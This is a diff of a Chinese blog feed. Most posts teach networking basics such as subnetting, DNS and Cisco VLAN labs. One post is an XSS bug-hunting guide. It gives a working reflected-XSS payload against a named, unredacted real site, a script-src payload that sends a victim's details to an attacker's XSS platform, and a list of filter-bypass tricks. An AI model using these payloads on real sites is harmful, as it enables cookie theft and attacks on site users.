+        <content type="html"><![CDATA[<h1 id="IP地址、子网掩码、网关、DNS的介绍"><a href="#IP地址、子网掩码、网关、DNS的介绍" class="headerlink" title="IP地址、子网掩码、网关、DNS的介绍"></a>IP地址、子网掩码、网关、DNS的介绍</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li><code>客户端</code>：应用 <code>C/S</code>（客户端&#x2F;服务器） <code>B/S</code>（浏览器&#x2F;服务器）;</li><li><code>服务器</code>：客户端提供服务、数据、资源的机器;</li><li><code>请求</code>：客户端向服务器索取数据;</li><li><code>响应</code>：服务器对客户端请求作出反应，一般是返回给客户端数据;</li><li><code>URL</code>：统一资源定位符（Uniform Resource Locator）, 网络中每一个资源都对应唯一的地址——URL;</li><li><code>MAC地址</code>：MAC（Media Access Control，介质访问控制）地址，又称物理地址, 如同我们身份证上的身份证号码，具有全球唯一性;</li><li><code>IP</code>：网络互连协议（Internet Protocol），是TCP&#x2F;IP体系中的网络层协议;</li><li><code>子网掩码</code>：子网掩码(subnet mask)又叫网络掩码、地址掩码、子网络遮罩;</li><li><code>网关</code>：网关(Gateway)又称网间连接器、协议转换器。网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连;</li><li><code>DNS</code>：域名系统(Domain Name System)，为Internet上的主机分配域名地址的IP地址;</li><li><code>DHCP</code>：由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。提升地址的使用率;</li></ul><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><blockquote><p>IP（网络之间互连的协议）它是能使连接到网上的所有计算机网络实现相互通信的一套规则，规定了计算机在因特网上进行通信时应当遵守的规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。IP地址有唯一性，即每台机器的IP地址在全世界是唯一的。这里指的是网络上的真实IP它是通过本机IP地址和子网掩码的”与”运算然后再通过各种处理算出来的；</p></blockquote><ul><li>tcp&#x2F;ip协议</li></ul><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议），也叫作网络通讯协议，是指能够在多个不同网络间实现信息传输的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。</p><ul><li>所谓IP地址就是给每个连接在Internet上的主机分配的一个32bit地址。按照TCP&#x2F;IP协议规定，IP地址用二进制来表示，每个IP地址长32bit，比特换算成字节，就是4个字节。例如一个采用二进制形式的IP地址是“00001010000000000000000000000001”，这么长的地址，人们处理起来也太费劲了。为了方便人们的使用，IP地址经常被写成十进制的形式，中间使用符号“.”分开不同的字节。于是，上面的IP地址可以表示为“10.0.0.1”。IP地址的这种表示法叫做“点分十进制表示法”，这显然比1和0容易记忆得多。</li></ul><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><blockquote><p>互联网是由许多小型网络构成的，每个网络上都有许多主机，这样便构成了一个有层次的结构。IP地址在设计时就考虑到地址分配的层次特点，将每个IP地址都分割成网络号和主机号两部分，以便于IP地址的寻址操作;  </p><p>子网掩码(subnet mask)又叫网络掩码、地址掩码、子网络遮罩；子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分；子网掩码不能单独存在，它必须结合IP地址一起使用。</p></blockquote><ul><li>常用子网掩码</li></ul><ol><li>子网掩码“255.255.255.0”的网络：<ol><li>最后面一个数字可以在0~255范围内任意变化，因此可以提供256个IP地址。但是实际可用的IP地址数量是256-2，即254个，因为主机号不能全是“0”或全是“1”。</li></ol></li><li>子网掩码“255.255.0.0”的网络：<ol><li>后面两个数字可以在0~255范围内任意变化，可以提供256²个IP地址。但是实际可用的IP地址数量是256²-2，即65534个。</li></ol></li></ol><p>Tips:</p><ol><li>IP地址的子网掩码设置不是任意的，应该根据网络的规模进行设置;</li><li>如果将子网掩码设置过大，也就是说子网范围扩大，那么，根据子网寻径规则，很可能发往和本地主机不在同一子网内的目标主机的数据，会因为错误的判断而认为目标主机是在同一子网内，导致数据包将在本子网内循环，直到超时并抛弃，使数据不能正确到达目标主机，导致网络传输错误；</li><li>如果将子网掩码设置得过小，那么就会将本来属于同一子网内的机器之间的通信当做是跨子网传输，数据包都交给缺省网关处理，这样势必增加缺省网关的负担，造成网络效率下降;</li></ol><h2 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h2><blockquote><p>网关(Gateway)又称网间连接器、协议转换器。网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。 网关是一种充当转换重任的计算机系统或设备。在使用不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同时，网关也可以提供过滤和安全功能。</p></blockquote><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><ul><li>DNS服务器</li></ul><blockquote><p>域名服务器(Domain Name Server)。在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，DNS就是进行域名解析的服务器;</p></blockquote><p>国内DNS推荐： <code>114.114.114.114</code> &#x2F; <code>114.114.114.115</code></p><p>更多DNS参考： <a href="https://blog.csdn.net/qq_14989227/article/details/78342237">https://blog.csdn.net/qq_14989227&#x2F;article&#x2F;details&#x2F;78342237</a></p><h2 id="IP与子网掩码换算"><a href="#IP与子网掩码换算" class="headerlink" title="IP与子网掩码换算"></a>IP与子网掩码换算</h2><ol><li>case 1<ul><li><p>如果要使这三个ip段在同一个网段内，那么这个大网段共同的子网掩码是多少呢？</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip段一：192.168.0.1——192.168.0.254</span><br><span class="line"></span><br><span class="line">ip段二：192.168.1.1——192.168.1.254</span><br><span class="line"></span><br><span class="line">ip段三：192.168.2.1——192.168.2.254</span><br></pre></td></tr></table></figure></li><li><p>我们来分析下：</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 将ip地址192.168.0.1转换为二进制</span></span><br><span class="line">11000000 10101000 00000000 0000000</span><br><span class="line"></span><br><span class="line"><span class="section"># 将ip地址192.168.1.1转换为二进制</span></span><br><span class="line">11000000 10101000 00000001 00000001</span><br><span class="line"></span><br><span class="line"><span class="section"># 将ip地址192.168.2.1转换为二进制</span></span><br><span class="line">11000000 10101000 00000010 00000001</span><br><span class="line"></span><br><span class="line">转换成了二进制，可以看得出，三个ip段的二进制前面 <span class="code">`22`</span> 位的是不变的，那么可以将他们表示成：</span><br><span class="line"></span><br><span class="line">ip段一：192.168.0.1/22</span><br><span class="line">ip段二：192.168.1.1/22</span><br><span class="line">ip段三：192.168.2.1/22</span><br><span class="line"></span><br><span class="line">这种192.168.2.x/22形式的ip地址相信大家平时都见过，就是已经告诉了子网掩码了。</span><br><span class="line">也就是说他们共同的子网掩码二进制前面22个都是1。</span><br><span class="line"></span><br><span class="line">11111111 11111111 11111100 00000000</span><br></pre></td></tr></table></figure></li></ul></li></ol><p>　　- 结果<br>转换成十进制，那就是255.255.252.0，所以他们共同的子网掩码就是<code>255.255.252.0</code>。</p><p>Reference</p><ul><li><a href="https://zhuanlan.zhihu.com/p/65226634">https://zhuanlan.zhihu.com/p/65226634</a></li><li><a href="https://blog.csdn.net/weixin_39676242/article/details/110257459">https://blog.csdn.net/weixin_39676242&#x2F;article&#x2F;details&#x2F;110257459</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 域名 </tag>
+            
+            <tag> 格式 </tag>
+            
+            <tag> 网络 </tag>
+            
+            <tag> 地址 </tag>
+            
+            <tag> 处理 </tag>
+            
+            <tag> 资源 </tag>
+            
+            <tag> 转换 </tag>
+            
+            <tag> 使用 </tag>
+            
+            <tag> 分配 </tag>
+            
+            <tag> 子网掩码 </tag>
+            
+            <tag> 互连 </tag>
+            
+            <tag> tcp </tag>
+            
+            <tag> 二进制 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XSS漏洞利用方式总结</title>
+      <link href="/posts/f060a0525a77/"/>
+      <url>/posts/f060a0525a77/</url>
+      
+        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近一直在挖漏洞，碰到的XSS漏洞最多了，今天就顺便来讲一下，如有错的地方，烦请指出。  </p><p>00×1    什么是XSS漏洞：  </p><p>     XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。 ​  </p><p>00×2    XSS漏洞有什么危害：  </p><p>     1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号  </p><p>     2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力  </p><p>     3、盗窃企业重要的具有商业价值的资料  </p><p>     4、非法转账  </p><p>     5、强制发送电子邮件  </p><p>     6、网站挂马  </p><p>     7、控制受害者机器向其它网站发起攻击  </p><p>​ ​  </p><p>00×3    XSS的分类：  </p><p>     1，反射型：  </p><p>     定义：非持久型、参数型  </p><p>     出现位置：网站搜索栏、用户登入口位置  </p><p>     2，存储型  </p><p>     定义：持久型  </p><p>     出现位置：网站留言、评论、博客日志等交互处  </p><p>     3，DOM型  </p><p>00×4    XSS漏洞的挖掘：  </p><p>     如何去挖掘XSS呢？手工+工具+思路+勤奋的双手&#x3D;漏洞  </p><p>     手工：自己构造payload，见框就插  </p><p>     工具：safe3，AWVS，Burpsuite丶Appscan丶XssSniper浏览器插件丶cookie修改工具  </p><p>     思路：个人信息，留言板，评论等，注意观察url变化，也可能会出现其他漏洞，如：逻辑漏洞  </p><p>     勤奋：不要总以为自己看一遍就会了，多去实战才能积累经验  </p><p>     漏洞：当你看到别人挖到了这个网站的漏洞，你就不挖了，他可能只是过滤了一个字符呢？漏洞无处不在，思路很重要  </p><p>​  </p><p>00×5    XSS绕过方法总结：  </p><p>     1，绕过单引号<br>     2，绕过 SCRIPT 过滤<br>     3，使用 IMG 源<br>     4，使用制表符 换行符和回车符<br>     5，使用空白符<br>     6，双引号配对的 bug<br>     7，绕过css过滤器<br>     8，不全面的过滤器<br>     9，转义字符<br>     10，编码  </p><p>00×6    XSS的简单闭合案例：  </p><p>     我已经找到了一个反射型的XSS，我就不打码了  </p><p>      域名：<a href="http://so.kuge.cc/">http://so.kuge.cc/</a>  </p><p>     是酷鸽网的一个分站，首先我们插入正常的XSS代码    <script>alert('XSS')</script>  </p><p>     查看源代码，我们发现他已经插入到html代码中，但是没弹框，不要放弃，我们接着看  </p><p>       </p><p>   </p><p>     我们发现<a href="https://www.cnblogs.com/XunanSec/p/?op=news&k=<script>alert('XSS')</script> " class="a">新闻</a>  </p><p>  重点在&lt;a标签，我们发现前面一个&lt;a到后面”&gt;结束这一小部分  </p><p>  我们开始构造payload，闭合<a>标签 payload：”&gt;<script>alert('XSS')</script>&lt;a  </p><p>成功弹窗  </p><p>​  </p><p>00×7    利用XSS获取目标IP：  </p><p>     首先你要找到一个存在XSS漏洞的站，反射型XSS也好，储存型XSS也好，DOM型的也一样  </p><p>     还是刚才那个，域名：<a href="http://so.kuge.cc/">http://so.kuge.cc/</a>  </p><p>     构造payload：  </p><p>     <a href="http://so.kuge.cc/search.phpk=&quot;&gt;">http://so.kuge.cc/search.phpk=&quot;&gt;</a><script src=你的XSS平台></script>&lt;a  </p><p>  可以缩短发给目标，目标打开后，接收目标信息  </p><p>00×8   新手在寻找XSS时所存在的一些误区：  </p><p>     1，误区1：XSS，不是专门去“绕过”限制。  </p><p>     打个简单的比方，一个已经被层层把守的大门，面前荆棘无数，而你又单枪匹马的，怎么闯的进去？ 这个时候你要意识到，走大门是不可能的。其实我们要突破的城防，有很多小门可以进去的，甚至不需要任何手段就可以直接走进去。我们为什么不走呢？  </p><p>     XSS是很好防御的，不就是过滤一下么，所以我们不要太多寄希望与程序员错误的过滤逻辑，而应该把希望寄托于程序员的“忘记过滤”上。  </p><p>     2，误区2： XSS，不仅仅存在于你所看得见的位置。  </p><p>大部分新手，在寻找XSS时，都会在一些评论框去输入XSS代码，然后看页面有没有弹窗。当然不是说这个方法没有用，而是这种方法，几乎很难“碰”到一个XSS。所以很多新手会觉得XSS怎么这么难找到。原因有几点：A）：像评论框，个人资料这种，你所能想到的位置。稍微有一点安全意识的程序员也能想到，所以经常是被过滤掉的。<br>B）：你所填入的资料，并不总是以HTML标签的形式，输出到页面上。所以有时候并不是不能X，只是因为你填入的东西不对。  </p><p>看不见有两个层面：  </p><p>A） 输入看不见。  </p><p>建议大家在提交请求的时候，使用抓包软件，然后对请求的参数逐个测试。  </p><p>B)  输出看不见。  </p><p>建议大家对返回的数据，也可以使用抓包软件抓取数据，然后对抓回的数据进行搜索，搜索你输入的数据，来定位看不见的输出。  </p><p>3，误区3： XSS，绕过限制不是让你乱用字符去绕过，切忌盲目。<br>     某人在看到代码是 <a href="https://www.cnblogs.com/XunanSec/p/xxxx\\u0022"> 的时候，问大家：“为什么\u0022”不行啊？ 这种绕过是盲目的。  </p><p>     在测试初期，我们如果不愿意去看对方的代码逻辑，可以采用“盲目”的方式去测试（用各种特殊字符去试探），这样可以节省很多时间。但是，当我们已经能够确定，数据输出位于哪个点时，比如上面这个<br>xxxx ，我们已经知道是输出到了 href&#x3D;”https://www.cnblogs.com/XunanSec/p/之间"  的时候。我们就不能盲目的去"绕过”，一定要有针对性。这个针对性主要是以下几点。  </p><p>A) 输出点，是直接输出，还是经过了DOM。  </p><p>  简单通俗点的说法是：<br>  前者可以通过右键查看源代码，搜索到。<br>  后者通过右键查看源代码是搜索不到的。  </p><p>B) 直接输出点，是位于HTML标签里，还是位于Script脚本里，或者是Style里  </p><p>  HTML标签又分为：<br>    是在HTML标签之间： <div> 内容在这里 </div><br>    还是在HTML属性之间： <img alt="内容在这里"><br>    还是在HTML事件之间:  <img><br>  Script&#x2F;style标签：<br>    根据输出自己去构造闭合，保证语法正确即可。  </p><p>C)  DOM输出点，这个需要一定的JS基础。<br>  C.1) 定位输出内容的JS代码段。<br>  C.2) 查看此代码段，是否存在过滤问题。<br>  C.3) 如果存在，制定绕过规则。  </p><p>D) 输出点，采用的什么过滤规则<br>  D.1)了解以上B)中，<br>    每个点该过滤什么字符，<br>    如果没过滤什么字符，该怎么去利用。<br>  D.2)逐个测试法，看看目标输出点，到底过滤了哪些字符<br>  D.3)测试服务器端的一些转换逻辑，比如有些服务器会先将&quot;转换为”<br>  D.4)确定是否可绕过，不能绕过的尽早放弃  </p><p>     总之，首先要了解如何防御，你才能了解，如何绕过，不能盲目。其中，B+D的规则基本是死的，偶尔碰上些服务器端过滤逻辑有问题的，是可以绕过的，尤其是服务器端采用黑名单的方式时。C则较为灵活，所谓的“绕过”往往是针对这种。​  </p><p>4，其它：  </p><p>A) 代码里明明看到插入了 <script>，怎么不执行啊？  </p><p>这种问题，zone里貌似有几个帖子了，这里强调下，打开调试工具看代码的时候，请注意颜色。<br>以chrome为例，只有<script>..</script>标记以彩色显示时，才说明是插入了，而以黑色显示时，实际上的代码是：&lt;script&gt;….<br>&lt;&#x2F;script&gt; ，其它标签同理。  </p><p>B) <xxx xxxx="xxx"> 这个放进去怎么不行啊？  </p><p>首先确定你这个是XSS代码，此外，一些新手会在网上找到一些旧的资料，而有些XSS代码是IE6时代的产物，或者是浏览器特异的代码，所以一定要注意代码来源，适用于什么浏览器。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 域名 </tag>
+            
+            <tag> 网站 </tag>
+            
+            <tag> 漏洞 </tag>
+            
+            <tag> xss </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> 帐号 </tag>
+            
+            <tag> 持久型 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>全球IP归属</title>
+      <link href="/posts/b14be65d97c1/"/>
+      <url>/posts/b14be65d97c1/</url>
+      
+        <content type="html"><![CDATA[<p>很有个性的IP，很可惜，中国没有！</p><blockquote><p>– 1.1.1.1 APNIC（澳大利亚）</p><p>– 2.2.2.2 法国电信</p><p>– 3.3.3.3 通用电器</p><p>– 4.4.4.4 Level3(美国服务商)</p><p>– 5.5.5.5 德国电信</p><p>– 6.6.6.6 美国陆军</p><p>– 7.7.7.7 美国国防部</p><p>– 8.8.8.8 谷歌</p><p>– 9.9.9.9 IBM</p></blockquote><p>普及点知识：</p><p><img src="https://static.luozhinet.com/be/3da5c2a82a8f8f57a0708186fa3b47"></p><h3 id="你看看这些公司数据，地址块啊！"><a href="#你看看这些公司数据，地址块啊！" class="headerlink" title="你看看这些公司数据，地址块啊！"></a>你看看这些公司数据，地址块啊！</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://static.luozhinet.com/52/0011821e84b0ce4396f95da415b523"></h3><p>美国特殊数据</p><p><img src="https://static.luozhinet.com/9a/3789ef87f414ca840412f306203021"></p><p>列举这些，每个公司或者机构都分配了巨量的IP，数量为16777216（一千六百多万个IP）</p><p><em>中国这些地址块都没分到，只有一些零碎的。但数量远不如美国啊，人均更不用说了！</em></p><h3 id="看看这些部分各国的IP数据！"><a href="#看看这些部分各国的IP数据！" class="headerlink" title="看看这些部分各国的IP数据！"></a>看看这些部分各国的IP数据！</h3><p><img src="https://static.luozhinet.com/5a/2d4276c5bc138cb4711675abb2e272"></p><p>中国IP分配：<img src="https://static.luozhinet.com/e0/2e1f641452d03403c154b4972793fa"></p><p>知道现在装宽带没什么没公网IP了吧，早就用完了，现在运营商NAT分配，全面进入内网了，你懂得！哈哈哈！！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网站推荐 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 地址 </tag>
+            
+            <tag> 分配 </tag>
+            
+            <tag> 4.4.4.4 </tag>
+            
+            <tag> 9.9.9.9 </tag>
+            
+            <tag> 7.7.7.7 </tag>
+            
+            <tag> 6.6.6.6 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网络基本认识（一）</title>
+      <link href="/posts/28d96d8946a8/"/>
+      <url>/posts/28d96d8946a8/</url>
+      
+        <content type="html"><![CDATA[<p>网络中存在2个地址<br>IP、MAC<br>谁是互联网的主要地址呢？ IP</p><p>为什么不是MAC地址呢？</p><p>根据OSI七层模型，交换机是工作在数据链路层，主要基于MAC地址转发，比较安全。通俗来讲MAC地址在以太网通过交换机进行通信，也就是MAC地址主要在局域网中传输。</p><p>路由器是工作在网络层，也就是IP层。国际互联网主要是路由器来做交换的，IP地址是基于路由器转发的 。路由器系统构成了基于TCP&#x2F;IP 的国际互联网络Internet 的主体脉络，也可以说，路由器构成了Internet的骨架。</p><p>1 .实验：使用ipconfig命令查看自己的ip地址<br>使用ping命令去ping对方，查看结果<br>2 .疑问：我们的通信发生在以太网内部的，两台主机之间的设备<br>也是交换机，交换机基于MAC地址转发数据包<br>为什么使用ping命令，ping对方的ip地址能够ping通呢？<br>3. 分析：如果数据包携带的是目的地的ip地址，到达交换机以后<br>交换机只有一个字：滚，看来不可能是只写了ip地址的<br>必然是同时写了mac地址的<br>4 .结论： pcA去试图和pcB进行访问的时候，实现知道了pcB的ip地址<br>以后，使用ARP协议（地址解析协议），去广播询问pcB的MAC地址<br>主机B受到询问以后，进行回答，主机A获取到主机B的MAC地址<br>以太网通信的时候，知道了目的地的ip地址以后，必须通过ARP协议<br>解析到目的地的MAC地址，只有知晓了目的地的MAC地址以后，才能<br>经过交换机进行通信<br>ARP分为一问一答<br>192.168.1.1   192.168.1.2<br>who has 192.168.1.2 tell 192.168.1.1 广播包，所有人都会收到<br>192.168.1.2 is at 9A-3F-4B-21-67-1C<br>5 .引申 如何基于ARP实现一种黑客攻击，让你的同桌掉线？<br>如何使用ARP协议实现中间人攻击，从而获取到你同桌的账号密码呢？<br>6 .防御 从网络工程师的角度上，如何防御以太网中的大量广播，以及ARP攻击问题呢？最基本的办法就是划分VLAN<br>7 .实验流程以及相应命令<br>a .百度 下载cisco packet tracer 6.2<br>b .拖拽一台交换机 cisco2960系列交换机，两台电脑连接到交换机上<br>c. 分别配置两台电脑的ip地址为192.168.1.1 和192.168.1.2<br>d. 使用ping命令去ping192.168.1.2 观察ping结果<br>使用ping -t 192.168.1.2 再次观察不同<br>e. 在交换机上使用命令<br>Switch&gt;enable &#x2F;&#x2F;进入特权模式<br>Swith#configure terminal &#x2F;&#x2F;进入到全局模式<br>Switch(config)#vlan 10 &#x2F;&#x2F;创建一个vlan10<br>switch(config)#vlan 20 &#x2F;&#x2F;创建一个vlan20<br>Switch(config)#interface fa0&#x2F;1 &#x2F;&#x2F;进入到交换机连接到pc1的接口<br>switch(config-if)#switchport mode access<br>switch(config-if)#switchport access vlan 10 &#x2F;&#x2F;把接口划分到vlan10中<br>Switch(config)#interface fa0&#x2F;2 &#x2F;&#x2F;进入到交换机连接到pc2的接口<br>switch(config-if)#switchport mode access<br>switch(config-if)#switchport access vlan 20 &#x2F;&#x2F;把接口划分到vlan10中<br>f .再次观察两台主机是否能够ping通</p><p>扩展，如果再加一个交换机呢？又怎么样划分VLAN？怎样PC0单独和PC2进行通信？</p><p><img src="https://static.luozhinet.com/5c/a6f33f509f611f9003d59ae2588de2"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 地址 </tag>
+            
+            <tag> ping </tag>
+            
+            <tag> 百度 </tag>
+            
+            <tag> 交换机 </tag>
+            
+            <tag> mac </tag>
+            
+            <tag> switch </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网络基本认识，思科模拟器基础实验（二）</title>
+      <link href="/posts/b3d7a3b38b65/"/>
+      <url>/posts/b3d7a3b38b65/</url>
+      
+        <content type="html"><![CDATA[<p>跨越不同交换机的相同VLAN互通实验</p><p><img src="https://static.luozhinet.com/24/ee48819e32d252ef8b65d3af5b8bfd"></p><p>如图所示，把两台交换机连接的pc，分别划分进入到vlan10和vlan20中，实验目的为vlan10的主机可以跨越交换机实现通信，vlan20的主机可以跨越交换机实现通信，vlan10和vlan20的主机彼此之间无法通信，基本配置和实验1类似，正常在交换机上划分vlan和把接口划分进入到vlan中，需要注意的是交换机之间的链路需要配置成trunk，配置trunk的命令如下</p><p>Interface f0&#x2F;3</p><p>Switchport mode trunk</p><p>当把交换机之间的链路配置成为trunk以后，trunk链路允许多个vlan的流量通过</p><p>所以VLAN10和vlan20的流量都可以在trunk链路上传输</p><p>在传输的过程中，vlan的流量会打上标记，所以到了另外一侧交换机，交换机可以根据数据包中的标记来确定流量来自于哪一个vlan</p><p>通过前两个实验，可以得到结论：只有一个vlan可以通过的接口为access接口，可以有多个vlan同时通过的接口为trunk接口</p><p>配置命令总结</p><p>Switchport mode access</p><p>Switchport access vlan xxx</p><p>Switchport mode trunk</p><p>单臂路由实验</p><p><img src="https://static.luozhinet.com/78/84d0a436904b275dc60bf0e4c7dfe5"></p><p>在前面的实验中，我们可以得到结论：在交换机连接PC的局域网里，相同VLAN可以通信，不同VLAN不能进行通信，那么实际工作中是怎样的呢？</p><p>在实际工作中，我们确实会对不同vlan的流量进行隔离，例如vlan10无法直接访问vlan20，但是更多的情况下，不同vlan的流量还是可以进行三层通信的。</p><p>例如，我们和百度可以进行三层通信，我们可以ping的通百度，但是我们无法发送广播包到百度，我们也无法ARP欺骗攻击到百度，这就是区别。所以我们认为三层的通信是安全的，2层的直接通信是危险的</p><p>那么如何实现不同vlan的互相访问呢？这个时候就需要使用路由器作为3层中转了</p><p>配置过程如下，交换机下联PC的接口作为access接口并分别划分进入到vlan10和vlan20</p><p>交换机配置</p><p>Vlan10</p><p>Vlan 20</p><p>Interface f0&#x2F;1</p><p>Switchport mode access</p><p>Switchport access vlan 10</p><p>Interface f0&#x2F;2</p><p>Switchport mode access</p><p>Switchport access vlan 20</p><p>Interface f0&#x2F;3   &#x2F;&#x2F;进入到交换机上联路由器的接口</p><p>Switchport mode trunk  &#x2F;&#x2F;配置上联接口为trunk接口，trunk接口同时可以允许两个vlan通过</p><p>路由器配置</p><p>Interface f0&#x2F;0   &#x2F;&#x2F;进入路由器下联交换机的接口</p><p>No shutdown  &#x2F;&#x2F;打开接口</p><p>Exit</p><p>Interface f0&#x2F;0.1   &#x2F;&#x2F;进入路由器的虚拟子接口</p><p>Encapsulation dot1q 10              &#x2F;&#x2F;配置子接口属于</p><p>vlan10 Ip address 192.168.1.254 255.255.255.0    &#x2F;&#x2F;配置vlan10 PC的网关IP地址</p><p>Interface f0&#x2F;0.2</p><p>Encapsulaiton dot1q 20          &#x2F;&#x2F;配置子接口属于vlan20</p><p>Ip address 192.168.2.254 255.255.255.0  &#x2F;&#x2F;配置vlan20 的PC的网关IP地址</p><p>此时测试PC1和PC2的通信，正常情况下可以ping通，此时实现了不同vlan的PC通过路由器实现了三层通信，因为交换机上联路由器只有一个接口，此项技术称之为：单臂路由</p><p>还有一个可以替代路由器的东西，万一路由器出现问题了呢？于是便引入三层交换机。</p><p>把三层交换机替代掉路由器，又该怎么配置呢？如图所示：</p><p><img src="https://static.luozhinet.com/58/1187635f114133932ad0b2ca6d0c5e"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 地址 </tag>
+            
+            <tag> ping </tag>
+            
+            <tag> 百度 </tag>
+            
+            <tag> 交换机 </tag>
+            
+            <tag> vlan </tag>
+            
+            <tag> trunk </tag>
+            
+            <tag> vlan10 </tag>
+            
+            <tag> switchport </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网络安全吗？</title>
+      <link href="/posts/e6ec7d37d9e7/"/>
+      <url>/posts/e6ec7d37d9e7/</url>
+      
+        <content type="html"><![CDATA[<p>互联网的发展，让整个世界变成了一个地球村，无数的数据从我们的生活中溜过，极大地方便的我们的生活。比如QQ、微信社交软件成为我们生活的一部分，貌似已经离不开它们了！</p><p>0和1看似很简单的数字，却让整个人类开启了信息革命！比如现在的很火的，物联网、机器学习，人工智能。在我还在上高中的时候，谁能想到智能手机能发展那么快！从山寨机–&gt;诺基亚–&gt;智能手机，并且网络的速度变得越来越快！从当初直板手机的GPRS网络，到GSM（俗称2G网络），到WCDMA（也就是3G）网络，再到今天的LTE（4G网络），可是人类还是不满足，又开启了5G网络，网络变得越来越快！<img src="https://static.luozhinet.com/bc/d0f2ddb7fec327c4de33f0085a91b2"></p><p>网络发展巨快，还记得高中的时候安卓设备的版本才2.2，现在的软件的迭代速度真的让我吃惊！现在配置很低的手机大概最低都是安卓5.0了吧！网络的快速发展也催生了Tencent、Alibaba、百度这些科技巨头。在众多异构网络上，让整个世界串在了一起，真的无法想象，一旦网络瘫痪，世界将会变成什么样子。</p><p>现在的人们几乎一半的时间都花费在虚拟的网络上，网络真的安全吗？</p><p>你知道网络管理吗？网络管理是这样定义的：网络管理包括对硬件、软件、和人力的使用、综合与协调，以便对网络资源进行监视、测试、配置、分析、评价和控制，这样就能以合理的价格满足网络的一些需求，如实时运行性能、服务质量等。网络管理简称网管。</p><p>现在不少的国家都采取对网络的限制、控制、过滤，这些都是很正常的行为，不光我们国家，很多国家都采取对网络的管理。包括日本、韩国、英国、法国、俄罗斯等，你们认为美国不进行网络监控吗？答案是否定的！要不然怎么会有斯诺登事件呢？<img src="https://static.luozhinet.com/d2/37c52d51746f7dc875441a0935338c"></p><p>现在的社会网络变得越来越不安全，越来越让我们感到不安！信息泄露，个人隐私根本都不是隐私，隐私都是白菜价，1毛钱甚至都不值钱都出售给其他人了，骚扰电话不断，越来越让我们感到苦恼，现在的我们该做些什么呢？难道说我们不用电子设备，不去触碰它，我们的隐私就安全了！错！现在的社会充满了摄像头和监控，赤裸的在大庭广众之下，我们又有什么办法呢！</p><p>网络这个东西在传输的过程中，在数不清U型管中跑来跑去，就像一个花瓶，这个花瓶，个太大了，人们想法就把这个花瓶彻底打碎，变成能够传输的碎片，传到其他人手中再重新组装成一个和原来一样花瓶。于是网络催生了各种协议，来保证这个花瓶的可用性。所以呢，人们能把花瓶打碎再重新复原组装起来，也能把这些碎片备份成很多份，以便于控制和管理。所以网络从来都不是安全的，都是可控的。</p><p>网络是个双刃剑，怎么使用才是最重要的，网络的使用要遵守相关的法律和政策，作为一个普通人是无法和国家机器抗衡的。要做的只有管好我们自己，爱自己的国家，维护国家的尊严！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络 </tag>
+            
